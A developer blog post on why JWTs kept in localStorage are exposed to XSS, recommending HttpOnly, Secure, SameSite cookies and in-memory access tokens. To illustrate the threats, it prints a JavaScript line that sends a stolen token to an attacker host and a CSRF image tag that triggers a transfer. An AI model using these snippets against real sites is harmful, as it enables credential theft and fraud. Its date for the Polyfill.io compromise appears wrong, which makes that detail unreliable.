# Why "Don't Store JWT in localStorage" — Auth History and the Cookie Return

**Tags:** Security, Authentication, JWT, Web, Full Stack  
**Date:** 2026-05-27  
**Source inspiration:** Zenn trending (370 likes)

---

The rule has been repeated so many times it feels like dogma: *don't store JWT in localStorage*. But most developers who follow it couldn't explain the full chain of reasoning behind it — or why the industry is increasingly returning to cookies as the primary session mechanism.

This post walks through the history, the actual attack surfaces, and what a secure modern auth setup looks like.

## The localStorage Problem Is XSS

When you store a JWT in `localStorage`, any JavaScript running on your page can read it. That includes injected scripts from XSS attacks — either from your own code, a compromised third-party dependency, or a CDN you trust.

```javascript
// Any attacker-controlled JS running on your origin can do this
const token = localStorage.getItem('access_token');
fetch('https://evil.example.com/steal?t=' + token);
```

The attack surface is enormous. A single `eval()`, an unsanitized `dangerouslySetInnerHTML`, or a compromised npm package in your bundle is all it takes.

> [!WARNING]
> The problem isn't localStorage itself — it's that any JS on your origin has full read access to it. XSS turns this into a one-line exfiltration.

## The JWT Craze and Why localStorage Became Popular

Around 2014–2018, stateless JWTs became the default recommendation for SPAs. The logic was sound at the time:

| Approach | Session storage | State required server-side |
|---|---|---|
| Session cookie | Server memory / Redis | Yes |
| JWT in cookie | Cookie jar | No (just signature verification) |
| JWT in localStorage | localStorage | No |

The stateless property was attractive. You could scale horizontally without sticky sessions or a shared Redis. Teams building microservices especially liked that you could verify a JWT independently in each service without a network call to an auth server.

`localStorage` felt natural: no cookie configuration, no SameSite headaches, works across tabs, easy to pass in `Authorization: Bearer` headers.

The problem is that convenience doesn't equal security.

## Why HttpOnly Cookies Are Safer

An `HttpOnly` cookie cannot be read by JavaScript — at all. The browser sends it with every same-origin request, but `document.cookie` returns nothing for it. XSS can no longer exfiltrate the token directly.

```http
Set-Cookie: session=<token>; HttpOnly; Secure; SameSite=Strict; Path=/
```

The relevant flags:

| Flag | What it does |
|---|---|
| `HttpOnly` | Prevents JS access — no `document.cookie` read |
| `Secure` | Only sent over HTTPS |
| `SameSite=Strict` | Not sent on cross-site requests (CSRF mitigation) |
| `SameSite=Lax` | Sent on top-level navigations but not sub-resource cross-site requests |

## The CSRF Trade-off

The trade-off people cite for cookies is CSRF — Cross-Site Request Forgery. If a cookie is automatically sent with every request to your origin, a malicious site can trigger state-changing requests.

```html
<!-- On evil.example.com -->
<img src="https://yourapp.com/api/transfer?amount=1000&to=attacker">
```

The browser will helpfully attach your session cookie when loading that "image".

Modern mitigations have largely closed this gap:

1. **`SameSite=Strict`** — cookie is never sent cross-site. Most robust, but breaks OAuth redirect flows.
2. **`SameSite=Lax`** — default in modern browsers. Sent on top-level navigations (clicking a link), but not on cross-site sub-resource requests or form POSTs. Effectively neutralizes the `<img>` attack above.
3. **CSRF tokens** — server issues a random token per session, frontend reads it via a separate non-HttpOnly cookie or meta tag and includes it in requests.

For most applications, `SameSite=Lax` + `HttpOnly` is the pragmatic balance.

## The Modern Recommendation

The industry has settled back on cookies — specifically, `HttpOnly` + `Secure` + `SameSite=Lax` — for storing session tokens or refresh tokens. JWTs themselves haven't disappeared; many systems issue short-lived JWTs stored in memory (not persistent storage) and use an `HttpOnly` cookie for the refresh token.

```
[Login] → Server issues:
  - Short-lived access JWT (5–15 min) → returned in response body, stored in JS memory only
  - Long-lived refresh token → Set-Cookie: HttpOnly; Secure; SameSite=Lax

[API call] → Authorization: Bearer <access JWT from memory>

[Access JWT expires] → POST /auth/refresh with refresh cookie (auto-sent by browser)
                     → Server validates refresh token, issues new access JWT
```

This pattern gives you:
- **No XSS-readable persistent token** — access JWT lives only in JS memory (gone on refresh/tab close)
- **HttpOnly refresh cookie** — XSS cannot read or steal it
- **SameSite=Lax** — CSRF protection without custom tokens

> [!TIP]
> If you're building a server-side rendered app (Next.js with App Router, for example), you can keep the access JWT entirely server-side and never expose it to browser JS at all. The BFF (Backend for Frontend) pattern takes this further.

## What's Actually Risky Today

The risks aren't theoretical. Real supply chain attacks on npm packages have exfiltrated tokens from localStorage. The 2023 Polyfill.io compromise injected malicious scripts into millions of sites.

The `localStorage` attack is trivial to execute: you don't need to find an XSS in *your* code — you need to find one in any third-party script you load, or compromise any package your bundle depends on.

With an `HttpOnly` cookie, that same injected script cannot read the token. It's not a silver bullet (an attacker with JS execution can still make authenticated requests in the user's browser session), but it eliminates the most common exfiltration vector.

## Key Takeaways

- `localStorage` is readable by any JS on your origin — XSS turns it into a credential theft
- `HttpOnly` cookies prevent JS from reading the token at all
- `SameSite=Lax` handles most CSRF scenarios without additional token infrastructure
- The modern pattern: short-lived JWT in memory + `HttpOnly` refresh cookie
- For SSR apps, consider never exposing tokens to the browser at all
